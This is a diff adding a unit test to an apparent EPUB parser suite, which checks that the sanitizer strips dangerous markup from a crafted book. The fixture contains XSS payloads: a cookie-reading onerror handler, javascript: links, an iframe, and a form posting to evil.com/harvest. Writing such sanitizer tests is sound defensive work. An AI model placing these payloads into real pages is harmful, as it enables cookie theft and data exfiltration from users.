@@ -216,4 +216,67 @@ describe('Gutenberg EPUB3 Parser & Document Stitcher (parseEpubArchive)', () => 
     expect(p).not.toBeNull();
     expect(p?.closest('a')).toBeNull(); // p should NOT be inside any <a> tag!
   });
+
+  it('sanitizes inline event handlers, javascript: links, disallowed tags, and external images (SEC-001, PRI-001)', () => {
+    const maliciousEpub = zipSync({
+      mimetype: strToU8('application/epub+zip'),
+      'META-INF/container.xml': strToU8(`
+        <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
+          <rootfiles>
+            <rootfile full-path="package.opf" media-type="application/oebps-package+xml"/>
+          </rootfiles>
+        </container>
+      `),
+      'package.opf': strToU8(`
+        <package version="3.0" unique-identifier="pub-id" xmlns="http://www.idpf.org/2007/opf">
+          <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
+            <dc:title>Security Test Book</dc:title>
+            <dc:creator>Tester</dc:creator>
+          </metadata>
+          <manifest>
+            <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml" />
+          </manifest>
+          <spine>
+            <itemref idref="ch1" />
+          </spine>
+        </package>
+      `),
+      'ch1.xhtml': strToU8(`
+        <html xmlns="http://www.w3.org/1999/xhtml">
+          <body>
+            <h2>Chapter with Potential Injections</h2>
+            <img src="https://tracking-site.com/pixel.png" alt="Tracking pixel" />
+            <img src="invalid-image.jpg" onerror="alert(document.cookie)" alt="Attack image" />
+            <p onclick="alert('clicked')" onmouseover="alert('hover')">Clickable text</p>
+            <a href="javascript:alert('xss')">Malicious Link</a>
+            <a href="javascript: void(0)">Void Link</a>
+            <iframe src="https://evil.com"></iframe>
+            <form action="https://evil.com/harvest"><input name="leak" value="123"/></form>
+            <object data="evil.swf"></object>
+          </body>
+        </html>
+      `)
+    });
+
+    const parsed = parseEpubArchive(maliciousEpub.buffer);
+    const container = document.createElement('div');
+    container.innerHTML = parsed.htmlContent;
+
+    // 1. Event handlers stripped
+    expect(parsed.htmlContent).not.toContain('onerror');
+    expect(parsed.htmlContent).not.toContain('onclick');
+    expect(parsed.htmlContent).not.toContain('onmouseover');
+
+    // 2. Dangerous href protocols removed
+    expect(parsed.htmlContent).not.toContain('javascript:');
+
+    // 3. Disallowed elements removed
+    expect(container.querySelector('iframe')).toBeNull();
+    expect(container.querySelector('form')).toBeNull();
+    expect(container.querySelector('input')).toBeNull();
+    expect(container.querySelector('object')).toBeNull();
+
+    // 4. External tracking image stripped
+    expect(parsed.htmlContent).not.toContain('https://tracking-site.com/pixel.png');
+  });
 });
